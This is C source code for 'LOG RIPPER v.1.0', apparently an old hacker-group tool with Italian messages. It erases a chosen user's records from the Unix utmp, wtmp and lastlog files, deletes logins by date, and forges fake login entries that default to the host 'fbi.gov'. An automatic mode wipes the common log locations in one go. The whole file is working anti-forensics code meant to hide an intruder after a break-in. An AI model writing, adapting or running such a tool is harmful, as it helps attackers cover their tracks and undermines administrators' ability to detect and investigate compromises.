/*     	   
                   ***********************************
                             LOG RIPPER v.1.0 
                             by ElectroRipper
	 	   *********************************** 

                         _
                        (_).     /\/\
                          .     (()())
                                /    \
                                \    /
                                //||\\
               

				ElectroRipper



*/


#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <utmp.h>
#include <lastlog.h>
#include <fcntl.h>
#include <pwd.h>
#include <time.h>

void cancellanometmp(char *nomelog, char *nomeuser){
 int f,t;
 FILE *g;
 char comando[1024];	
 struct utmp tmplog;
		
	printf("\n\rCancello da %s l'user %s",nomelog,nomeuser);
																							
        f=open(nomelog,O_RDWR);
	g=fopen("tmplr","wb");

	t=0;

        while(read(f,&tmplog,sizeof(tmplog))>0){
        	if ((strncmp(tmplog.ut_user,nomeuser,strlen(nomeuser)))&&!((t==1)&&(strlen(tmplog.ut_user)<2))){
        		fwrite(&tmplog,sizeof(tmplog),1,g);
			t=0;
		}

		else  t=t^1;
	}


        close(f);
	fclose(g);

	strcpy(comando,"cp tmplr ");
	strcat(comando,nomelog);

	system(comando);

	unlink("tmplr");
}


void cancelladatatmp(char *nomelog, char *data){
 int f;
 FILE *g;
 char comando[1024];
 struct utmp tmplog;

	printf("\n\rCancello da %s tutti i login che contengono %s nella data",nomelog,data);	

        f=open(nomelog,O_RDWR);
        g=fopen("tmplr","wb");

        while(read(f,&tmplog,sizeof(tmplog))>0){
       	        if (!strstr(ctime(&tmplog.ut_time),data)){
 	                        fwrite(&tmplog,sizeof(tmplog),1,g);
                }		
        }


        close(f);
        fclose(g);

        strcpy(comando,"cp tmplr ");
        strcat(comando,nomelog);

        system(comando);


       unlink("tmplr");
}


void veditmp(char *nomelog,char *nomeuser){
 int f;
 struct utmp tmplog;
	

	printf("\n\r");
        f=open(nomelog,O_RDWR);

        while(read (f, &tmplog, sizeof (tmplog))>0){
     	if ((!strncmp(tmplog.ut_user,nomeuser,strlen(nomeuser)))||(!strcmp(nomeuser," "))) 
	 printf("\r%s %s %s",tmplog.ut_user,tmplog.ut_host,ctime(&tmplog.ut_time));			 
        }

        close(f);

	
}


void cancellalastlog(char *nomelog,char *nomeuser){
 int f;
 struct lastlog illog;
 struct passwd *pwd;

	printf("\n\rCancello l'user %s da %s",nomeuser,nomelog);

	pwd=getpwnam(nomeuser);
	f=open(nomelog,O_RDWR);

	lseek(f,(long)pwd->pw_uid*sizeof(illog),0);
	bzero((char *)&illog,sizeof(illog));
	write(f,(char *)&illog,sizeof(illog));
	close(f);


		
}

void aggiungitmp(char *nomelog,char *username,char *host){
 int f;
 struct utmp tmplog;
 
	printf("\n\rAggiugo l'user %s con host %s a %s",username,host,nomelog);
 	bzero(&tmplog,sizeof(tmplog));
	strcpy(tmplog.ut_name,username);
	strcpy(tmplog.ut_host,host);
	f=open(nomelog,O_RDWR);
	write(f,&tmplog,sizeof(tmplog));	
	close(f);
	
}


void automatica(char *username){

printf("\n\rCancello l'user %s dai log piu' comuni",username);
	cancellalastlog("/var/adm/lastlog",username);
	cancellalastlog("/var/log/lastlog",username);
	cancellanometmp("/var/run/utmp",username);
	cancellanometmp("/var/log/wtmp",username);
	cancellanometmp("/var/adm/utmp",username);
	cancellanometmp("/var/adm/wtmp",username);
	cancellanometmp("/var/log/utmp",username);
	cancellanometmp("/etc/utmp",username);

	
}


main(int argc, char *argv[]){

char *data;
		
		system("clear");
		printf("\033[20;33m                           .....LOG RIPPER v.1.0...."); 
		printf("\n\n\r\033[13;32m                               di ElectroRipper");
		printf("\n\r                            -=[L0rds of DarKnesS]=-");			
		printf("\033[7;0m\n\n\n\r");
        if ((argc<2)||((argc<3)&&(!strcmp(argv[1],"ma")))||((argc<3)&&(!strcmp(argv[1],"vt")))||((argc<4)&&((!strcmp(argv[1],"ctn"))||(!strcmp(argv[1],"ctd"))||(!strcmp(argv[1],"cl"))||(!strcmp(argv[1],"at"))))){
		printf("\n\n\033[10;36mLeggere il file di aiuto per un elenco delle funzioni\033[7;0m\n\n\r");
		exit(-1);
	}		
			


	if (!strcmp(argv[1],"ct")){
		cancellanometmp(argv[2],argv[3]);
	}		

	if (!strcmp(argv[1],"ctd")){
		data = (char*)malloc(100);
		strcpy(data,argv[3]);

		if (argc>4){ 
			strcat(data," ");
			strcat(data,argv[4]);
		}

		if (argc>5){
			strcat(data," ");		
			strcat(data,argv[5]);			
		}

		cancelladatatmp(argv[2],data);
	}

	if (!strcmp(argv[1],"cl")){
		cancellalastlog(argv[2],argv[3]);
	}

	if (!strcmp(argv[1],"vt")){
		if (argc>3) veditmp(argv[2],argv[3]);
	 	else veditmp(argv[2]," ");
	} 


	if (!strcmp(argv[1],"at")){
		if (argc<5) aggiungitmp(argv[2],argv[3],"fbi.gov");
		else aggiungitmp(argv[2],argv[3],argv[4]);
	}


	if (!strcmp(argv[1],"ma")){
		automatica(argv[2]);
	}
	
        printf("\033[7;0m\n\n\n\r");

}


